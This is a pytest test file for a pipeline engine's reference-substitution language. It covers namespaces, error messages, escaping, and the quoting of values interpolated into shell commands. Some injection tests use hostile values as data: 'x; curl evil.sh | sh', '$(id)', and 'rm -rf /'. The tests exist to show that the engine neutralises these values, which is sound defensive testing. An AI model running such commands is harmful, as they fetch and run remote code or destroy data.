"""Tests for the reference language: the whole of it, and nothing more."""

from datetime import UTC, datetime

import pytest

from dirigent_core.engine.references import (
    ReferenceScope,
    UnknownReference,
    has_reference,
    references_in,
    resolve,
    resolve_config,
)
from dirigent_core.ids import uuid7

RUN_ID = uuid7()


@pytest.fixture
def scope() -> ReferenceScope:
    """A scope with something in every namespace."""
    return ReferenceScope(
        params={"day": "2026-08-28", "regions": ["no", "se"], "count": 3, "nested": {"deep": {"x": 1}}},
        outputs={"fetch": {"status": 200, "body": {"id": "abc"}}, "list": [{"n": 1}, {"n": 2}]},
        item="oslo",
        has_item=True,
        scratch="file://artifacts/runs/1",
        run_id=RUN_ID,
    )


def test_a_whole_reference_keeps_its_type(scope: ReferenceScope) -> None:
    assert resolve("${params.count}", scope) == 3
    assert resolve("${params.regions}", scope) == ["no", "se"]
    assert resolve("${steps.fetch.output.status}", scope) == 200
    assert resolve("${steps.fetch.output.body}", scope) == {"id": "abc"}


def test_an_embedded_reference_interpolates_as_text(scope: ReferenceScope) -> None:
    assert resolve("/v1/ingest/${item}", scope) == "/v1/ingest/oslo"
    assert resolve("${params.day} has ${params.count}", scope) == "2026-08-28 has 3"


def test_a_value_with_no_reference_is_returned_unchanged(scope: ReferenceScope) -> None:
    assert resolve("plain", scope) == "plain"
    assert resolve(7, scope) == 7
    assert resolve(None, scope) is None
    assert resolve(True, scope) is True


def test_references_resolve_through_nested_structure(scope: ReferenceScope) -> None:
    resolved = resolve_config(
        {"headers": {"X-Day": "${params.day}"}, "body": ["${item}", {"n": "${params.count}"}]},
        scope,
    )
    assert resolved == {"headers": {"X-Day": "2026-08-28"}, "body": ["oslo", {"n": 3}]}


def test_a_dotted_path_walks_objects_and_lists(scope: ReferenceScope) -> None:
    assert resolve("${params.nested.deep.x}", scope) == 1
    assert resolve("${steps.list.output.1.n}", scope) == 2


def test_the_run_namespace_exposes_scratch_and_id(scope: ReferenceScope) -> None:
    assert resolve("${run.scratch}/out.json", scope) == "file://artifacts/runs/1/out.json"
    assert resolve("${run.id}", scope) == str(RUN_ID)


def test_a_boolean_interpolates_as_json_and_none_as_empty(scope: ReferenceScope) -> None:
    wide = ReferenceScope(params={"on": True, "off": False, "gap": None})
    assert resolve("v=${params.on},${params.off},${params.gap}", wide) == "v=true,false,"


def test_an_unknown_namespace_names_the_language(scope: ReferenceScope) -> None:
    with pytest.raises(UnknownReference, match="params, steps, item, and run"):
        resolve("${secrets.token}", scope)


def test_an_unknown_parameter_says_what_exists(scope: ReferenceScope) -> None:
    with pytest.raises(UnknownReference, match="params has no 'missing'"):
        resolve("${params.missing}", scope)


def test_an_unknown_step_says_which_steps_have_output(scope: ReferenceScope) -> None:
    with pytest.raises(UnknownReference, match="step 'nope' has no stored output"):
        resolve("${steps.nope.output.x}", scope)


def test_a_step_reference_must_read_output(scope: ReferenceScope) -> None:
    with pytest.raises(UnknownReference, match="steps.<name>.output.<field>"):
        resolve("${steps.fetch.status}", scope)


def test_an_item_reference_outside_a_fan_out_step_is_refused() -> None:
    with pytest.raises(UnknownReference, match="does not fan out"):
        resolve("${item}", ReferenceScope())


def test_an_item_field_resolves_inside_a_mapped_object() -> None:
    scope = ReferenceScope(item={"code": "no", "name": "Norway"}, has_item=True)
    assert resolve("${item.code}", scope) == "no"
    with pytest.raises(UnknownReference, match="item has no 'nope'"):
        resolve("${item.nope}", scope)


def test_the_run_namespace_is_closed(scope: ReferenceScope) -> None:
    with pytest.raises(UnknownReference, match="run.scratch, run.id, run.window.start and run.window.end"):
        resolve("${run.pipeline}", scope)


def test_the_run_window_resolves_to_both_ends_as_iso_8601() -> None:
    windowed = ReferenceScope(
        window_start=datetime(2026, 1, 1, tzinfo=UTC),
        window_end=datetime(2026, 1, 2, tzinfo=UTC),
    )
    assert resolve("${run.window.start}", windowed) == "2026-01-01T00:00:00+00:00"
    assert resolve("${run.window.end}", windowed) == "2026-01-02T00:00:00+00:00"
    assert resolve("?from=${run.window.start}&to=${run.window.end}", windowed) == (
        "?from=2026-01-01T00:00:00+00:00&to=2026-01-02T00:00:00+00:00"
    )


def test_a_run_with_no_window_refuses_the_reference_and_says_it_carries_none(scope: ReferenceScope) -> None:
    for reference in ("${run.window.start}", "${run.window.end}"):
        with pytest.raises(UnknownReference, match="this run carries no window"):
            resolve(reference, scope)


def test_the_window_namespace_is_closed_at_its_two_edges() -> None:
    windowed = ReferenceScope(
        window_start=datetime(2026, 1, 1, tzinfo=UTC),
        window_end=datetime(2026, 1, 2, tzinfo=UTC),
    )
    with pytest.raises(UnknownReference, match="run exposes only"):
        resolve("${run.window}", windowed)
    with pytest.raises(UnknownReference, match="run exposes only"):
        resolve("${run.window.middle}", windowed)


def test_an_empty_reference_is_refused(scope: ReferenceScope) -> None:
    with pytest.raises(UnknownReference, match="names nothing"):
        resolve("${.}", scope)


def test_walking_into_a_scalar_says_so(scope: ReferenceScope) -> None:
    with pytest.raises(UnknownReference, match="it is not an object"):
        resolve("${params.count.nope}", scope)


def test_references_in_lists_every_reference_a_value_names() -> None:
    assert references_in({"a": "${params.x}", "b": ["${item}", 1], "c": 2}) == ["params.x", "item"]
    assert references_in("no references here") == []


def test_a_value_interpolated_into_a_shell_command_never_reaches_the_shells_parser() -> None:
    """The injection this closes is reachable by anyone who can POST to a webhook."""
    scope = ReferenceScope(params={"region": "x; curl evil.sh | sh"})
    resolved = resolve_config({"command": "load ${params.region}"}, scope, shell_fields={"command"})
    assert resolved["command"] == 'load "$DIRIGENT_V0"'
    assert resolved["shell_variables"] == {"DIRIGENT_V0": "x; curl evil.sh | sh"}


def test_a_reference_the_author_quoted_takes_no_quotes_of_its_own() -> None:
    """``echo "${x}"`` is what shell quoting could not close: there the quotes were the value's."""
    scope = ReferenceScope(params={"region": "$(id) two words"})
    resolved = resolve_config({"command": 'load "${params.region}"'}, scope, shell_fields={"command"})
    assert resolved["command"] == 'load "$DIRIGENT_V0"'
    assert resolved["shell_variables"] == {"DIRIGENT_V0": "$(id) two words"}


def test_a_reference_inside_the_authors_single_quotes_is_the_text_the_shell_says_it_is() -> None:
    """Single quotes are literal to a shell, so what they hold is the variable and not its value."""
    scope = ReferenceScope(params={"region": "oslo"})
    resolved = resolve_config({"command": "load '${params.region}'"}, scope, shell_fields={"command"})
    assert resolved["command"] == "load '$DIRIGENT_V0'"
    assert resolved["shell_variables"] == {"DIRIGENT_V0": "oslo"}


def test_the_quoting_a_reference_lands_in_is_read_through_escapes_and_nesting() -> None:
    """Every form a command writes quotes in, so a value keeps its word boundaries in each."""
    scope = ReferenceScope(params={"x": "a b"})
    commands = {
        'echo \\"${params.x}': 'echo \\""$DIRIGENT_V0"',
        'echo "it\\"${params.x}"': 'echo "it\\"$DIRIGENT_V0"',
        'echo "$(cat "${params.x}")"': 'echo "$(cat "$DIRIGENT_V0")"',
        'echo "$(cat ${params.x})"': 'echo "$(cat "$DIRIGENT_V0")"',
        "echo `cat ${params.x}`": 'echo `cat "$DIRIGENT_V0"`',
        "echo 'it'${params.x}": "echo 'it'\"$DIRIGENT_V0\"",
    }
    for command, expected in commands.items():
        assert resolve_config({"command": command}, scope, shell_fields={"command"})["command"] == expected


def test_each_reference_in_a_command_gets_a_variable_of_its_own() -> None:
    scope = ReferenceScope(params={"region": "oslo", "day": "2026-08-28"})
    resolved = resolve_config(
        {"command": "load ${params.region} ${params.day} ${params.region}"}, scope, shell_fields={"command"}
    )
    assert resolved["command"] == 'load "$DIRIGENT_V0" "$DIRIGENT_V1" "$DIRIGENT_V2"'
    assert resolved["shell_variables"] == {
        "DIRIGENT_V0": "oslo",
        "DIRIGENT_V1": "2026-08-28",
        "DIRIGENT_V2": "oslo",
    }


def test_substitution_leaves_the_metacharacters_the_author_typed_alone() -> None:
    """A pipe the pipeline author wrote is the reason the shell form exists at all."""
    scope = ReferenceScope(params={"name": "oslo"})
    resolved = resolve_config({"command": "cat ${params.name}.csv | wc -l"}, scope, shell_fields={"command"})
    assert resolved["command"] == 'cat "$DIRIGENT_V0".csv | wc -l'
    assert resolved["shell_variables"] == {"DIRIGENT_V0": "oslo"}


def test_a_command_that_is_entirely_a_reference_is_one_word_and_not_a_program() -> None:
    """Otherwise a parameter is not an argument to a program, it *is* the program."""
    scope = ReferenceScope(params={"cmd": "rm -rf /"})
    resolved = resolve_config({"command": "${params.cmd}"}, scope, shell_fields={"command"})
    assert resolved["command"] == '"$DIRIGENT_V0"'
    assert resolved["shell_variables"] == {"DIRIGENT_V0": "rm -rf /"}


def test_only_the_fields_the_block_marked_are_rewritten() -> None:
    """Rewriting a value that is not going to a shell would corrupt it."""
    scope = ReferenceScope(params={"region": "a b"})
    resolved = resolve_config(
        {"command": "echo ${params.region}", "argv": ["echo", "${params.region}"], "cwd": "${params.region}"},
        scope,
        shell_fields={"command"},
    )
    assert resolved["command"] == 'echo "$DIRIGENT_V0"'
    assert resolved["argv"] == ["echo", "a b"]
    assert resolved["cwd"] == "a b"
    assert resolved["shell_variables"] == {"DIRIGENT_V0": "a b"}


def test_nothing_is_rewritten_and_no_variables_are_carried_when_no_field_was_marked(scope: ReferenceScope) -> None:
    resolved = resolve_config({"command": "echo ${item}"}, scope)
    assert resolved == {"command": "echo oslo"}


def test_a_document_cannot_carry_its_own_shell_variables(scope: ReferenceScope) -> None:
    """Whatever a stored document put there, the resolution is what the block is handed."""
    resolved = resolve_config(
        {"command": "echo ${item}", "shell_variables": {"DIRIGENT_V0": "mine"}}, scope, shell_fields={"command"}
    )
    assert resolved["shell_variables"] == {"DIRIGENT_V0": "oslo"}


def test_an_escaped_reference_yields_the_literal_braces(scope: ReferenceScope) -> None:
    """The escape is what lets a compose file or a template carry its own braces through."""
    assert resolve("$${GREETING}", scope) == "${GREETING}"
    assert resolve("echo $${HOME} to ${item}", scope) == "echo ${HOME} to oslo"
    assert resolve("$${params.day}", scope) == "${params.day}"


def test_an_escaped_reference_is_never_looked_up(scope: ReferenceScope) -> None:
    assert resolve("$${params.missing}", scope) == "${params.missing}"
    assert resolve("$${secrets.token}", scope) == "${secrets.token}"


def test_a_double_dollar_with_no_brace_is_left_alone(scope: ReferenceScope) -> None:
    """A shell command's $$ is the process id, and nothing here may touch it."""
    assert resolve("echo $$", scope) == "echo $$"
    assert resolve("pid=$$ day=${params.day}", scope) == "pid=$$ day=2026-08-28"
    assert resolve("$$HOME", scope) == "$$HOME"


def test_a_triple_dollar_is_an_escaped_dollar_before_a_reference(scope: ReferenceScope) -> None:
    """The dollars collapse in pairs, so the odd one left over still starts a reference."""
    assert resolve("$$${item}", scope) == "$oslo"
    assert resolve("$$$${item}", scope) == "$${item}"


def test_an_escaped_reference_is_text_even_when_it_is_the_whole_value(scope: ReferenceScope) -> None:
    assert resolve("$${params.count}", scope) == "${params.count}"


def test_an_escaped_reference_reaches_a_shell_as_the_text_it_is(scope: ReferenceScope) -> None:
    """It is text the author typed, so it keeps its meaning to the shell like any other."""
    resolved = resolve_config({"command": "echo $${HOME} ${item}"}, scope, shell_fields={"command"})
    assert resolved["command"] == 'echo ${HOME} "$DIRIGENT_V0"'
    assert resolved["shell_variables"] == {"DIRIGENT_V0": "oslo"}


def test_an_escaped_reference_is_not_a_reference_the_document_names(scope: ReferenceScope) -> None:
    assert references_in({"a": "$${params.x}", "b": "${item}", "c": "$$${params.day}"}) == ["item", "params.day"]
    assert has_reference("$${params.x}") is False
    assert has_reference("${params.x}") is True
    assert has_reference("$$") is False


def test_everything_that_resolved_before_the_escape_resolves_identically(scope: ReferenceScope) -> None:
    """A corpus of today's forms, so the escape can only ever add spellings."""
    assert resolve("${params.count}", scope) == 3
    assert resolve("${params.regions}", scope) == ["no", "se"]
    assert resolve(" ${params.count} ", scope) == " 3 "
    assert resolve("${ params.count }", scope) == 3
    assert resolve("${steps.fetch.output.body}", scope) == {"id": "abc"}
    assert resolve("${steps.list.output.1.n}", scope) == 2
    assert resolve("/v1/ingest/${item}", scope) == "/v1/ingest/oslo"
    assert resolve("${params.day} has ${params.count}", scope) == "2026-08-28 has 3"
    assert resolve("${run.scratch}/out.json", scope) == "file://artifacts/runs/1/out.json"
    assert resolve({"a": ["${item}", 1], "b": {"c": "${params.day}"}}, scope) == {
        "a": ["oslo", 1],
        "b": {"c": "2026-08-28"},
    }
    assert resolve("$5 and 100%", scope) == "$5 and 100%"
    assert resolve("{not a reference}", scope) == "{not a reference}"
    shell = resolve_config({"command": "echo ${item}"}, scope, shell_fields={"command"})
    assert shell["command"] == 'echo "$DIRIGENT_V0"'


@pytest.fixture
def paired_scope() -> ReferenceScope:
    """A scope for an item of a step that maps over another fan-out's grid."""
    return ReferenceScope(
        item="oslo",
        has_item=True,
        item_index=1,
        grids={"spread": ["bergen", "oslo"]},
        item_outputs={"spread": {"path": "s3://bucket/oslo.json"}},
        paired=frozenset({"spread"}),
    )


def test_a_step_reads_its_matching_item_in_a_step_it_shares_a_grid_with(paired_scope: ReferenceScope) -> None:
    assert resolve("${steps.spread.item.output.path}", paired_scope) == "s3://bucket/oslo.json"
    assert resolve("${steps.spread.item.output}", paired_scope) == {"path": "s3://bucket/oslo.json"}


def test_a_grid_resolves_to_the_list_the_step_maps_over(paired_scope: ReferenceScope) -> None:
    assert resolve("${steps.spread.items}", paired_scope) == ["bergen", "oslo"]


def test_a_matching_item_outside_the_grid_family_names_the_for_each_that_would_pair_them() -> None:
    scope = ReferenceScope(item_index=0)
    with pytest.raises(UnknownReference, match=r"write for_each: \$\{steps.spread.items\}"):
        resolve("${steps.spread.item.output.path}", scope)


def test_a_matching_item_that_did_not_succeed_says_which_item(paired_scope: ReferenceScope) -> None:
    scope = paired_scope.model_copy(update={"item_outputs": {}})
    with pytest.raises(UnknownReference, match="'spread'.s item 1 did not succeed"):
        resolve("${steps.spread.item.output.path}", scope)


def test_a_grid_nothing_holds_says_only_for_each_reads_it(scope: ReferenceScope) -> None:
    with pytest.raises(UnknownReference, match="only for_each reads it"):
        resolve("${steps.fetch.items}", scope)


def test_a_malformed_step_reference_lists_the_three_forms(scope: ReferenceScope) -> None:
    with pytest.raises(UnknownReference, match="steps.<name>.item.output.<field>"):
        resolve("${steps.fetch.body}", scope)
